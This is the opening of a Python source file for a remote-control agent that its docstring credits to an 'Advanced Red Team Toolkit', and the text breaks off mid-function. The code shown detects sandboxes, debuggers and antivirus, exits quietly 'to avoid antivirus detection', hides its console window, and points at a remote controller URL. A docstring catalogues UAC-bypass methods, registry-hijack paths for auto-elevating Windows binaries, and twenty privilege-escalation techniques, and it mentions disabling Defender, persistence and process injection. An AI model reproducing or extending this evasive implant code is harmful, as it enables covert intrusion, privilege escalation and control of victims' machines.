    #!/usr/bin/env python3

### client.py ###

def safe_execution_check():
    """
    Performs system validation and antivirus interference checks
    before allowing the script to execute fully.
    """
    import logging
    
    # Filter out noisy "WinError 10049" logs from aioice
    class WinErrorFilter(logging.Filter):
        def filter(self, record):
            return "WinError 10049" not in record.getMessage()
            
    # Apply filter to root logger and specific libraries
    logging.getLogger().addFilter(WinErrorFilter())
    logging.getLogger("aioice").addFilter(WinErrorFilter())
    logging.getLogger("aiortc").addFilter(WinErrorFilter())
    
    try:
        # Basic system requirements check
        import sys
        import os
        
        # Check Python version compatibility
        if sys.version_info < (3, 6):
            print("Error: Python 3.6 or higher is required", file=sys.stderr)
            return False
        
        # Check for common antivirus interference patterns
        if _check_antivirus_interference():
            return False
        
        # Validate system permissions (non-intrusive)
        if not _validate_system_permissions():
            return False
        
        # Perform platform-independent checks
        if not _platform_independent_checks():
            return False
        
        return True
        
    except Exception as e:
        # Log error quietly to avoid antivirus detection
        try:
            import os
            # Use a more stealthy approach - write to a temp file that gets cleaned up
            import tempfile
            temp_log = os.path.join(tempfile.gettempdir(), 'agent_startup.log')
            with open(temp_log, 'a') as f:
                f.write(f"Safe execution check failed: {e}\n")
            # Clean up after a short delay to avoid detection
            try:
                os.remove(temp_log)
            except:
                pass
        except:
            pass
        return False

def _check_antivirus_interference():
    """Check for common antivirus interference patterns"""
    try:
        import sys
        import os
        import time
        import platform
        
        # Check if we're running in a sandbox or restricted environment
        # Look for common antivirus sandbox indicators
        
        # Check for delayed execution (common in sandboxes)
        start_time = time.time()
        time.sleep(0.001)  # Tiny delay to detect timing anomalies
        end_time = time.time()
        
        # If timing is significantly off, might be in a sandbox
        if (end_time - start_time) > 0.1:  # 100x normal delay
            return True
        
        # Check for common sandbox file indicators
        suspicious_files = [
            'C:\\sample.exe',
            'C:\\malware.exe',
            'C:\\virus.exe',
            # Add more as needed
        ]
        
        for file_path in suspicious_files:
            if os.path.exists(file_path):
                return True
        
        # Check for registry keys that indicate sandbox environment (Windows only)
        if sys.platform == 'win32':
            try:
                import winreg
                # Try to access a key that might be restricted in sandboxes
                try:
                    winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion")
                except WindowsError:
                    # If we can't access common registry keys, might be restricted
                    return True
            except ImportError:
                # winreg not available, skip this check
                pass
        
        # Check for common antivirus process names
        try:
            import psutil
            antivirus_processes = [
                'MsMpEng.exe',      # Windows Defender
                'AvastSvc.exe',     # Avast
                'AVGIDSAgent.exe',  # AVG
                'McAfee.exe',       # McAfee
                'Norton.exe',       # Norton
                'Kaspersky.exe',    # Kaspersky
            ]
            
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'] in antivirus_processes:
                        # Antivirus is running, but this is normal
                        # Just log it for debugging, don't fail
                        pass
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except ImportError:
            # psutil not available, skip this check
            pass
        
        # Check for common sandbox indicators
        sandbox_indicators = [
            # Check if running under a debugger
            sys.gettrace() is not None,
            # Check if running in a virtual environment (might be sandbox)
            hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix),
            # Check for common sandbox usernames
            os.environ.get('USERNAME', '').lower() in ['sandbox', 'test', 'malware', 'virus'],
            # Check for common sandbox computer names
            platform.node().lower() in ['sandbox', 'test-pc', 'malware-test'],
        ]
        
        if any(sandbox_indicators):
            return True
        
        return False
        
    except Exception:
        # If any check fails, assume interference
        return True

def _validate_system_permissions():
    """Validate system permissions without triggering antivirus alerts"""
    try:
        import sys
        import os
        import tempfile
        
        # Test basic file operations in a safe way
        test_file = os.path.join(tempfile.gettempdir(), 'agent_test.tmp')
        
        try:
            # Try to create a temporary file (safe operation)
            with open(test_file, 'w') as f:
                f.write('test')
            
            # Try to read it back
            with open(test_file, 'r') as f:
                content = f.read()
            
            # Clean up
            os.remove(test_file)
            
            # If we get here, basic permissions are OK
            return True
            
        except (IOError, OSError, PermissionError):
            # Permission issues detected
            return False
        
    except Exception:
        # If we can't validate permissions, fail safely
        return False

def _platform_independent_checks():
    """Perform platform-independent validation checks"""
    try:
        import sys
        import os
        import platform
        
        # Check for common cross-platform issues
        
        # Check if we're running in a restricted environment
        # This works on all platforms
        restricted_env_vars = [
            'SANDBOX', 'VIRUS_TOTAL', 'MALWARE_ANALYSIS',
            'RESTRICTED_MODE', 'SAFE_MODE'
        ]
        
        for env_var in restricted_env_vars:
            if os.environ.get(env_var, '').lower() in ['true', '1', 'yes']:
                return False
        
        # Check for suspicious command line arguments
        suspicious_args = ['--sandbox', '--test', '--virus', '--malware']
        for arg in sys.argv[1:]:
            if arg.lower() in suspicious_args:
                return False
        
        # Check system uptime (very new systems might be sandboxes)
        try:
            if sys.platform == 'win32':
                # Windows: Check system uptime via WMI
                try:
                    import subprocess
                    result = subprocess.run(['wmic', 'os', 'get', 'lastbootuptime'], 
                                          capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        # Parse boot time and check if system is very new
                        # This is a heuristic - very new systems might be sandboxes
                        pass
                except (subprocess.TimeoutExpired, FileNotFoundError):
                    # WMI not available, skip this check
                    pass
            elif sys.platform in ['linux', 'darwin']:
                # Unix-like systems: Check uptime
                try:
                    with open('/proc/uptime', 'r') as f:
                        uptime_seconds = float(f.read().split()[0])
                        # If uptime is less than 5 minutes, might be a fresh sandbox
                        if uptime_seconds < 300:  # 5 minutes
                            # This is just a heuristic, don't fail immediately
                            pass
                except (FileNotFoundError, ValueError, PermissionError):
                    # /proc/uptime not available or can't be read
                    pass
        except Exception:
            # If uptime check fails, continue anyway
            pass
        
        # Check for common analysis tools
        analysis_processes = [
            'wireshark', 'tcpdump', 'processhacker', 'procmon',
            'autoruns', 'regmon', 'filemon', 'idaq', 'idaq64',
            'x64dbg', 'x32dbg', 'ollydbg', 'windbg'
        ]
        
        # Only check if psutil is available to avoid import errors
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if any(tool in proc_name for tool in analysis_processes):
                        # Analysis tools running, but this might be normal
                        # Just note it, don't fail
                        pass
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except ImportError:
            # psutil not available, skip this check
            pass
        
        return True
        
    except Exception:
        # If platform checks fail, assume safe to continue
        return True

# Run safe execution check before proceeding
if not safe_execution_check():
    # Exit quietly to avoid antivirus detection
    import sys
    try:
        # Clean exit - remove any temporary files we might have created
        import tempfile
        import os
        # Clean up any temp files that might exist
        temp_files = [f for f in os.listdir(tempfile.gettempdir()) if f.startswith('agent_test') or f.startswith('agent_startup')]
        for temp_file in temp_files:
            try:
                os.remove(os.path.join(tempfile.gettempdir(), temp_file))
            except:
                pass
    except:
        pass
    finally:
        sys.exit(0)

# Original silent mode code continues...
import sys
import os

# Silent mode for compiled executable
if getattr(sys, 'frozen', False):
    # Running as compiled executable
    SILENT_MODE = True
    DEBUG_MODE = False
    
    # Suppress console
    if sys.platform == 'win32':
        import ctypes
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)  # Hide window
    
    # Redirect output
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
else:
    SILENT_MODE = False
    DEBUG_MODE = True

# ============================================================================
# CRITICAL: EVENTLET MONKEY PATCH - MUST BE ABSOLUTELY FIRST!
# ============================================================================
# This MUST run before ANY other imports that use threading!
# ============================================================================

import sys
import os
import warnings
import tempfile
import atexit
import time

try:
    import msvcrt  # Windows-only
except Exception:
    msvcrt = None

# -----------------------------------------------------------------------------
# SAFE SUBPROCESS WRAPPER – blocks accidental self-spawn of the frozen EXE
# -----------------------------------------------------------------------------
def _install_safe_subprocess_wrapper():
    try:
        import subprocess as _subprocess
        _orig_popen = _subprocess.Popen

        def _safe_popen(cmd, *args, **kwargs):
            try:
                if getattr(sys, "frozen", False) and not os.environ.get("CLIENT_ALLOW_SELF_SPAWN"):
                    current_exe = (sys.executable or "").lower()
                    current_script = (os.path.abspath(__file__) or "").lower()
                    target = ""
                    if isinstance(cmd, (list, tuple)):
                        target = " ".join(str(x) for x in cmd).lower()
                    else:
                        target = str(cmd).lower()
                    # Block launching our own EXE or the original script
                    if current_exe and current_exe in target:
                        raise RuntimeError("Blocked self-spawn of current executable")
                    if current_script and current_script in target:
                        raise RuntimeError("Blocked self-spawn of current script")
                return _orig_popen(cmd, *args, **kwargs)
            except Exception as _e:
                # Fail-safe: avoid crash if caller expects a process object
                raise

        _subprocess.Popen = _safe_popen
    except Exception:
        pass

# -----------------------------------------------------------------------------
# SINGLE-INSTANCE GUARD (prevents fork-bomb/self-spawn in frozen executables)
# -----------------------------------------------------------------------------
_INSTANCE_LOCK_FH = None
_INSTANCE_LOCK_PATH = os.path.join(tempfile.gettempdir(), "client_single_instance.lock")

def terminate_existing_client_processes():
    """Terminate any existing client.py or client.exe processes"""
    try:
        import psutil
        current_pid = os.getpid()
        terminated_count = 0
        
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.pid == current_pid:
                    continue
                    
                # Check if process is running client.py or client.exe
                cmdline = proc.info.get('cmdline', [])
                if not cmdline:
                    continue
                    
                is_client = False
                for arg in cmdline:
                    if 'client.py' in arg.lower() or 'client.exe' in arg.lower():
                        is_client = True
                        break
                
                if is_client:
                    print(f"[TERMINATE] Found existing client process PID {proc.pid}, terminating...")
                    proc.terminate()
                    try:
                        proc.wait(timeout=5)
                    except psutil.TimeoutExpired:
                        proc.kill()
                    print(f"[TERMINATE] Process {proc.pid} terminated")
                    terminated_count += 1
                    
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
                
        if terminated_count > 0:
            print(f"[TERMINATE] Terminated {terminated_count} existing client processes")
            time.sleep(1)  # Give processes time to fully terminate
            
    except ImportError:
        # Fallback to taskkill on Windows if psutil not available
        if sys.platform == 'win32':
            try:
                import subprocess
                # Kill any python processes running client.py
                subprocess.run(['taskkill', '/F', '/IM', 'python.exe', '/FI', 'WINDOWTITLE eq *client.py*'], 
                             capture_output=True, check=False)
                subprocess.run(['taskkill', '/F', '/IM', 'client.exe'], 
                             capture_output=True, check=False)
                print("[TERMINATE] Used taskkill to terminate existing client processes")
            except Exception as e:
                print(f"[TERMINATE] Warning: Error during process termination: {e}")
    except Exception as e:
        print(f"[TERMINATE] Warning: Error during process termination: {e}")

def _acquire_single_instance_lock() -> bool:
    global _INSTANCE_LOCK_FH
    if _INSTANCE_LOCK_FH is not None:
        return True
    try:
        # First terminate any existing processes
        terminate_existing_client_processes()
        
        _INSTANCE_LOCK_FH = open(_INSTANCE_LOCK_PATH, "a+")
        if msvcrt:
            try:
                msvcrt.locking(_INSTANCE_LOCK_FH.fileno(), msvcrt.LK_NBLCK, 1)
            except Exception:
                return False
        else:
            try:
                # Fallback: attempt exclusive rename to indicate ownership
                os.replace(_INSTANCE_LOCK_PATH, _INSTANCE_LOCK_PATH)
            except Exception:
                pass
        _INSTANCE_LOCK_FH.seek(0)
        _INSTANCE_LOCK_FH.truncate(0)
        _INSTANCE_LOCK_FH.write(str(os.getpid()))
        _INSTANCE_LOCK_FH.flush()
        atexit.register(_release_single_instance_lock)
        return True
    except Exception:
        return True  # Be permissive if lock cannot be established

def _release_single_instance_lock():
    global _INSTANCE_LOCK_FH
    try:
        if _INSTANCE_LOCK_FH:
            if msvcrt:
                try:
                    msvcrt.locking(_INSTANCE_LOCK_FH.fileno(), msvcrt.LK_UNLCK, 1)
                except Exception:
                    pass
            try:
                _INSTANCE_LOCK_FH.close()
            except Exception:
                pass
            _INSTANCE_LOCK_FH = None
    except Exception:
        pass

# Suppress ALL deprecation warnings globally and immediately
warnings.simplefilter("ignore", DeprecationWarning)
warnings.filterwarnings("ignore", category=DeprecationWarning, module="eventlet")
warnings.filterwarnings("ignore", message=".*Eventlet is deprecated.*")

# ============================================================================
# DEBUGGER MODE CONFIGURATION
# ============================================================================
# Set this to True to disable all print and log outputs
DEBUGGER_MODE = False  

# -----------------------------------------------------------------------------
# PyInstaller frozen guard – avoid running startup logic in child processes
# -----------------------------------------------------------------------------
def _is_main_process() -> bool:
    try:
        import multiprocessing
        return multiprocessing.current_process().name == "MainProcess"
    except Exception:
        return True

if getattr(sys, "frozen", False):
    # Block duplicate instances early
    if not _acquire_single_instance_lock():
        os._exit(0)
    # Install safe subprocess wrapper to block self-spawning
    _install_safe_subprocess_wrapper()

def debug_print(msg):
    """Print debug messages directly (bypasses all logging systems)"""
    # If debugger_mode is True, suppress ALL output
    if DEBUGGER_MODE:
        return
        
    if UAC_DEBUG:
        # Fix encoding issues - replace emojis with ASCII for Windows console
        msg = str(msg).replace('[ OK ]', '[OK]').replace('[ X ]', '[X]').replace('[ ! ]', '[!]')
        try:
            print(f"[DEBUG] {msg}", flush=True)
        except UnicodeEncodeError:
            # Fallback: encode to ASCII, ignore unicode errors
            print(f"[DEBUG] {msg.encode('ascii', 'ignore').decode('ascii')}", flush=True)

# Debug flag for UAC and privilege operations
UAC_DEBUG = False  # Set to True to see detailed UAC/privilege debugging

debug_print("=" * 80)
debug_print("PYTHON AGENT STARTUP - UAC PRIVILEGE DEBUGGER ENABLED")
debug_print("=" * 80)
debug_print(f"Python version: {sys.version}")
debug_print(f"Platform: {sys.platform}")
debug_print("=" * 80)

# Step 1: Import eventlet and patch IMMEDIATELY (OPTIONAL)
debug_print("Step 1: Importing eventlet...")
EVENTLET_AVAILABLE = False
try:
    import eventlet
    try:
        import eventlet.hubs
        eventlet.hubs.use_hub("eventlet.hubs.asyncio")
    except Exception:
        pass
    debug_print("[ OK ] eventlet imported successfully")
    EVENTLET_AVAILABLE = True
except Exception as e:
    debug_print(f"[ ! ] eventlet import FAILED: {e}")
    debug_print("[ ! ] Continuing WITHOUT eventlet (some async features may not work)")
    debug_print("[ ! ] To enable eventlet: pip install eventlet")
    eventlet = None  # Set to None for later checks

if EVENTLET_AVAILABLE:
    debug_print("Step 2: Running eventlet.monkey_patch()...")
    try:
        # CRITICAL: Suppress the RLock warning by redirecting stderr temporarily
        import io as _io
        old_stderr = sys.stderr
        sys.stderr = _io.StringIO()  # Capture stderr
        
        # Patch threading BEFORE any other imports!
        eventlet.monkey_patch(all=True, thread=True, time=True, socket=True, select=True)
        
        # Restore stderr
        captured_stderr = sys.stderr.getvalue()
        sys.stderr = old_stderr
        
        # Check if there was an RLock warning
        if "RLock" in captured_stderr:
            debug_print("[ ! ] RLock warning detected (Python created locks before eventlet patch)")
            debug_print("   This is EXPECTED and can be ignored - eventlet will patch future locks")
        
        debug_print("[ OK ] eventlet.monkey_patch() SUCCESS!")
        debug_print("   - all=True")
        debug_print("   - thread=True (threading patched)")
        debug_print("   - time=True")
        debug_print("   - socket=True")
        debug_print("   - select=True")
        EVENTLET_PATCHED = True
    except Exception as e:
        # Restore stderr if exception occurred
        try:
            sys.stderr = old_stderr
        except (AttributeError, ValueError):
            pass
        
        debug_print(f"[ ! ] eventlet.monkey_patch() FAILED: {e}")
        debug_print("[ ! ] Continuing without monkey patching")
        EVENTLET_PATCHED = False
        EVENTLET_AVAILABLE = False
else:
    debug_print("Step 2: Skipping eventlet.monkey_patch() (eventlet not available)")
    EVENTLET_PATCHED = False

# Add comprehensive exit handler for clean shutdown
def setup_exit_handlers():
    """Setup clean exit handlers for various shutdown scenarios"""
    import atexit
    import signal
    import sys
    
    def cleanup_handler(signum=None, frame=None):
        """Handle cleanup on various exit scenarios"""
        try:
            import os
            import tempfile
            
            # Clean up temporary files
            temp_files = [f for f in os.listdir(tempfile.gettempdir()) if f.startswith('agent_test') or f.startswith('agent_startup')]
            for temp_file in temp_files:
                try:
                    os.remove(os.path.join(tempfile.gettempdir(), temp_file))
                except:
                    pass
            
            # Close any open file handles
            try:
                if hasattr(sys, 'stdout') and hasattr(sys.stdout, 'close'):
                    sys.stdout.close()
            except:
                pass
            
            try:
                if hasattr(sys, 'stderr') and hasattr(sys.stderr, 'close'):
                    sys.stderr.close()
            except:
                pass
            
        except Exception:
            # If cleanup fails, just exit
            pass
        finally:
            # Exit cleanly
            return
    
    # Register cleanup for normal exit
    atexit.register(cleanup_handler)
    
    # Register signal handlers for various termination signals
    try:
        signal.signal(signal.SIGINT, cleanup_handler)   # Ctrl+C
        signal.signal(signal.SIGTERM, cleanup_handler)  # Termination
        if hasattr(signal, 'SIGBREAK'):
            signal.signal(signal.SIGBREAK, cleanup_handler)  # Windows Ctrl+Break
    except (AttributeError, ValueError):
        # Some signals might not be available on all platforms
        pass

# Setup exit handlers for clean shutdown
setup_exit_handlers()

debug_print("Step 3: Testing threading after monkey_patch()...")
try:
    import threading
    test_lock = threading.RLock()
    debug_print("[ OK ] threading.RLock() created successfully (should be patched)")
    del test_lock
except Exception as e:
    debug_print(f"[ X ] threading.RLock() test FAILED: {e}")

debug_print("=" * 80)
if EVENTLET_AVAILABLE:
    debug_print("EVENTLET SETUP COMPLETE - NOW IMPORTING OTHER MODULES")
else:
    debug_print("EVENTLET SKIPPED - CONTINUING WITHOUT IT")
debug_print("=" * 80)

# Suppress warnings AFTER eventlet patch
import warnings
from fractions import Fraction
warnings.filterwarnings('ignore', message='.*RLock.*')
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

#CREATED BY SPHINX
"""
Advanced Python Agent with UACME-Inspired UAC Bypass Techniques

This agent implements multiple advanced UAC bypass methods inspired by the UACME project:

UAC Bypass Methods Implemented:
- Method 25: EventVwr.exe registry hijacking
- Method 30: WOW64 logger hijacking  
- Method 31: sdclt.exe bypass
- Method 33: fodhelper/computerdefaults ms-settings protocol
- Method 34: SilentCleanup scheduled task
- Method 35: Token manipulation and impersonation
- Method 36: NTFS junction/reparse points
- Method 39: .NET Code Profiler (COR_PROFILER)
- Method 40: COM handler hijacking
- Method 41: ICMLuaUtil COM interface
- Method 43: IColorDataProxy COM interface
- Method 44: Volatile environment variables
- Method 45: slui.exe registry hijacking
- Method 56: WSReset.exe bypass
- Method 61: AppInfo service manipulation
- Method 62: Mock directory technique
- Method 67: winsat.exe bypass
- Method 68: MMC snapin bypass

Additional Advanced Features:
- Multiple persistence mechanisms (registry, startup, tasks, services)
- Windows Defender disable techniques
- Process hiding and injection
- Anti-VM and anti-debugging evasion
- Advanced stealth and obfuscation
- Cross-platform support (Windows/Linux)

Author: Advanced Red Team Toolkit
Version: 2.0 (UACME Enhanced)

ADDITIONAL VULNERABLE PROCESSES FOR UAC BYPASS:
#	Process Name	Location	Exploit Method	UAC Requirement	Notes
1	SystemPropertiesAdvanced.exe	%SystemRoot%\\System32\\	mscfile registry hijack (HKCU\\Software\\Classes\\mscfile\\shell\\open\\command)	Consent prompt only	Launches elevated System Properties
2	SystemPropertiesProtection.exe	%SystemRoot%\\System32\\	Same mscfile hijack as above	Consent prompt only	Opens System Restore settings
3	sysdm.cpl	%SystemRoot%\\System32\\	App Paths hijack (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\sysdm.cpl)	Consent prompt only	Old-style system settings CPL
4	iscsicpl.exe	%SystemRoot%\\System32\\	App Paths hijack	Consent prompt only	iSCSI Initiator Control Panel
5	ie4uinit.exe	%SystemRoot%\\System32\\	Special arguments /show or /cleariconcache + registry hijack	Consent prompt only	Can execute payload silently
6	wusa.exe	%SystemRoot%\\System32\\	Malicious .msu package with custom commands	Consent prompt only	Works on older builds
7	cliconfg.exe	%SystemRoot%\\System32\\	App Paths or DLL hijack	Consent prompt only	SQL Server config tool
8	lpksetup.exe	%SystemRoot%\\System32\\	Malicious .cab package	Consent prompt only	Legacy Language Pack Installer
9	pcwrun.exe	%SystemRoot%\\System32\\	COM hijack or App Paths	Consent prompt only	Program Compatibility Wizard
10	shell:AppsFolder	Shell protocol	Registry hijack (HKCU\\Software\\Classes\\Folder\\shell\\open\\command)	Consent prompt only	Opens Windows Apps folder elevated
11	ms-contact-support:	Protocol handler	Registry hijack under HKCU\\Software\\Classes\\ms-contact-support	Consent prompt only	Contact Support app (Win 10)
12	ms-get-started:	Protocol handler	Registry hijack	Consent prompt only	Get Started app launcher
13	cleanmgr.exe	%SystemRoot%\\System32\\	Scheduled task abuse with /autoclean or /verylowdisk	Consent prompt only	Disk Cleanup auto-elevates
14	hdwwiz.exe	%SystemRoot%\\System32\\	App Paths hijack	Consent prompt only	Hardware Wizard auto-elevates
15	WerFault.exe	%SystemRoot%\\System32\\	Trigger crash in elevated binary -> hijack debugger	Consent prompt only	Windows Error Reporting
16	taskschd.msc	%SystemRoot%\\System32\\	mscfile registry hijack	Consent prompt only	Task Scheduler snap-in
17	TiWorker.exe	%SystemRoot%\\WinSxS\\	DLL planting in servicing stack dirs	Works with credential prompt if service misconfig exists	TrustedInstaller context

PRIVILEGE ESCALATION METHODS (BYPASS CREDENTIAL PROMPT):
#	Method Name	Target Component	Exploit Type	Works on Standard User?	Notes
1	TiWorker.exe DLL Planting	TrustedInstaller (Windows Modules Installer)	DLL hijack in servicing stack folders	[ OK ]	SYSTEM-level, survives UAC settings, requires writable path in WinSxS temp dirs
2	Unquoted Service Path	Misconfigured Windows Service	Binary replacement	[ OK ]	If service path has spaces and is unquoted, drop payload in earlier path segment
3	Weak Service Binary Permissions	SYSTEM service executable	Binary replacement	[ OK ]	If service binary is writable by user, replace it with payload
4	Weak Service Registry Permissions	Service configuration registry key	Command replacement	[ OK ]	Change service ImagePath or parameters to run payload
5	DLL Search Order Hijacking (SYSTEM Services)	Any auto-start SYSTEM service	DLL planting	[ OK ]	Drop malicious DLL in folder searched before the real one
6	Scheduled Task Binary Replacement	SYSTEM-level scheduled task	Binary replacement	[ OK ]	Replace executable path of an existing SYSTEM task
7	Token Impersonation (SYSTEM Process)	SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege	Token theft	[ OK ]	Steal SYSTEM token via named pipe or thread hijack
8	Named Pipe Impersonation	SYSTEM service pipe	Token impersonation	[ OK ]	Trick service into connecting and impersonate SYSTEM
9	Print Spooler Service Abuse	Spoolsv.exe	Remote/local SYSTEM code execution	[ OK ]	Similar to PrintNightmare; patch-dependent
10	COM Service Hijacking (SYSTEM Context)	Auto-start COM objects	Registry hijack	[ OK ]	Change CLSID to point to malicious binary
11	Image File Execution Options (IFEO) for SYSTEM processes	Debugger key in registry	Binary hijack	[ OK ]	Force SYSTEM process to start debugger payload
12	Windows Installer Service Abuse	msiexec.exe	Custom MSI with SYSTEM execution	[ OK ]	If installer policy allows
13	WMI Event Subscription (SYSTEM Context)	WMI permanent event consumer	Code injection	[ OK ]	Persist and escalate on trigger event
14	Vulnerable Driver Exploits	Third-party drivers	Kernel exploit	[ OK ]	Use signed driver to read/write kernel memory
15	User-mode to Kernel-mode Exploits	Windows kernel (ntoskrnl.exe)	Memory corruption / race condition	[ OK ]	Requires CVE or 0-day
16	Shadow Copy Mounting	Volume Shadow Service	NTFS trick	[ OK ]	Mount shadow copy and replace protected files
17	SAM / SECURITY Hive Access (LSA Secrets)	Registry hives	Credential theft	[ OK ]	Requires volume shadow trick or backup privilege
18	BITS Job Hijacking	Background Intelligent Transfer Service	Command injection	[ OK ]	Replace BITS job payload
19	AppXSVC/AppX Deployment DLL Hijack	AppX Deployment Service	DLL planting	[ OK ]	Runs as SYSTEM
20	DiagTrack Service Abuse	Connected User Experiences and Telemetry	DLL planting	[ OK ]	SYSTEM-level telemetry service
"""

# Configuration flags
SILENT_MODE = False  # DISABLED for debugging - enable stealth operation (no console output)
DEBUG_MODE = True  # Enable debug logging for troubleshooting
UAC_PRIVILEGE_DEBUG = True  # Enable detailed UAC and privilege debugging

# Override with DEBUGGER_MODE
if DEBUGGER_MODE:
    SILENT_MODE = True
    DEBUG_MODE = False
    UAC_PRIVILEGE_DEBUG = False

DEPLOYMENT_COMPLETED = True  # Track deployment status to prevent repeated attempts
RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
KEEP_ORIGINAL_PROCESS = True  # FALSE = Exit original process after getting admin (prevent duplicates)
ENABLE_ANTI_ANALYSIS = True  # FALSE = Disabled (for testing), TRUE = Enabled (exits if debuggers/VMs detected)

 
DISABLE_UAC_BYPASS = True
UAC_BYPASS_ALLOWED = False
MAX_PROMPT_ATTEMPTS = None     # Limit prompts to 3 attempts instead of 999
BYPASSES_ENABLED = False
REGISTRY_ENABLED = False
PERSISTENT_ADMIN_PROMPT_ENABLED = False
# Controller URL override flag (set URL via env)
#FIXED_SERVER_URL_RAW = (os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com') or '').strip()
#FIXED_SERVER_URL = (os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com') or '').strip()
#FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com/dashboard')
#FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'http://localhost:3000')
USE_FIXED_SERVER_URL = True
def _resolve_controller_url():
    v1 = (os.environ.get('FIXED_SERVER_URL', '') or '').strip()
    v2 = (os.environ.get('CONTROLLER_URL', '') or '').strip()
    candidates = [
        v1,
        v2,
        'https://neural-control-hub.onrender.com',
        'http://127.0.0.1:8080'
    ]
    for u in candidates:
        if u and u.lower() not in ('none', 'null'):
            return u
    return 'https://neural-control-hub.onrender.com'
FIXED_SERVER_URL = _resolve_controller_url()
DISABLE_SLUI_BYPASS = True
UAC_BYPASS_DEBUG_MODE = False
UAC_BYPASS_METHODS_ENABLED = {
    'cleanmgr_sagerun': False,
    'fodhelper': False,
    'computerdefaults': False,
    'eventvwr': False,
    'sdclt': False,
    'wsreset': False,
    'slui': False,
    'winsat': False,
    'silentcleanup': False,
    'icmluautil': False,
    'runas_prompt': False
}
REGISTRY_ACTIONS = {
    'policy_push_notifications': False,
    'policy_windows_update': False,
    'context_runas_cmd': False,
    'context_powershell_admin': False,
    'notify_center_hkcu': False,
    'notify_center_hklm': False,
    'defender_ux_suppress': False,
    'toast_global_above_lock': False,
    'toast_global_critical_above_lock': False,
    'toast_windows_update': False,
    'toast_security_maintenance': False,
    'toast_windows_security': False,
    'toast_sec_health_ui': False,
    'explorer_balloon_tips': False,
    'explorer_info_tip': False,
    'disableRealtimeMonitoring': False
}

AGENT_ID_SAVE_WARNED = False

# Eventlet is now patched at the very top of the file (line 1-2)
# This section is kept for compatibility but monkey_patch is already done

# Stealth enhancer integration (gated)
try:
    from stealth_enhancer import *
    STEALTH_AVAILABLE = True
except ImportError:
    STEALTH_AVAILABLE = False

# Logging system for stealth operation
import logging
import io
import sys
import tempfile

# Import automated updater system
try:
    from client_updater import UpdateManager, UpdateStatus, get_updater, register_update_handlers, handle_update_notification
    UPDATER_AVAILABLE = True
    # print("SUCCESS: Automated updater system loaded successfully")
except ImportError as e:
    UPDATER_AVAILABLE = False
    # print(f"[!] Automated updater system not available: {e}")
    UpdateManager = None
    UpdateStatus = None
    get_updater = None
    register_update_handlers = None
    handle_update_notification = None

def setup_silent_logging():
    """Setup logging system that doesn't output to console"""
    if SILENT_MODE:
        # Create a null handler to suppress all output
        logging.basicConfig(
            level=logging.CRITICAL + 1,  # Above CRITICAL to suppress everything
            handlers=[logging.NullHandler()]
        )
        # Redirect stdout and stderr to null
        sys.stdout = io.StringIO()
        sys.stderr = io.StringIO()
    else:
        # Setup normal logging when not in silent mode
        logging.basicConfig(
            level=logging.INFO if DEBUG_MODE else logging.WARNING,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[logging.StreamHandler(sys.stdout)]
        )

def log_message(message, level="info"):
    """Log message with proper output handling"""
    if DEBUGGER_MODE:
        return

    if not SILENT_MODE:
        # Always print to console when not in silent mode
        print(f"[{level.upper()}] {message}")
        
        # Also log through logging system if debug mode is enabled
        if DEBUG_MODE:
            if level == "error":
                logging.error(message)
            elif level == "warning":
                logging.warning(message)
            else:
                logging.info(message)

# Initialize silent logging immediately
setup_silent_logging()

def _get_debug_log_path():
    try:
        base = os.path.join(os.environ.get('LOCALAPPDATA', '') or tempfile.gettempdir(), 'NeuralControlHub', 'logs')
        os.makedirs(base, exist_ok=True)
        return os.path.join(base, 'client_debug.log')
    except Exception:
        return os.path.join(tempfile.gettempdir(), 'client_debug.log')

DEBUG_LOG_PATH = _get_debug_log_path()

def _write_structured_debug(payload: dict, level: str = "info"):
    if DEBUGGER_MODE:
        return
        
    try:
        import json as _json
        import time as _time
        ts = int(_time.time() * 1000)
        payload = dict(payload or {})
        payload.setdefault('timestamp', ts)
        text = _json.dumps(payload, separators=(',', ':'), ensure_ascii=True)
        # print(text)
        if level == "error":
            logging.error(text)
        elif level == "warning":
            logging.warning(text)
        else:
            logging.info(text)
        try:
            with open(DEBUG_LOG_PATH, 'a', encoding='utf-8') as f:
                f.write(text + "\n")
        except Exception:
            pass
    except Exception:
        pass

def _collect_bypass_debug_context(method_id=None, method_name=None) -> dict:
    ctx = {}
    try:
        ctx['windows_available'] = bool(WINDOWS_AVAILABLE)
        ctx['is_admin'] = bool(is_admin())
    except Exception:
        ctx['is_admin'] = False
    try:
        ctx['defender_detected'] = bool(detect_defender_threats())
    except Exception:
        ctx['defender_detected'] = False
    try:
        ctx['silent_mode'] = bool(SILENT_MODE)
        ctx['debug_mode'] = bool(DEBUG_MODE)
        ctx['uac_bypass_debug_mode'] = bool(UAC_BYPASS_DEBUG_MODE)
        ctx['uac_bypass_allowed'] = bool(UAC_BYPASS_ALLOWED)
        ctx['disable_uac_bypass'] = bool(DISABLE_UAC_BYPASS)
        ctx['disable_slui_bypass'] = bool(DISABLE_SLUI_BYPASS)
        ctx['bypasses_enabled'] = bool(BYPASSES_ENABLED)
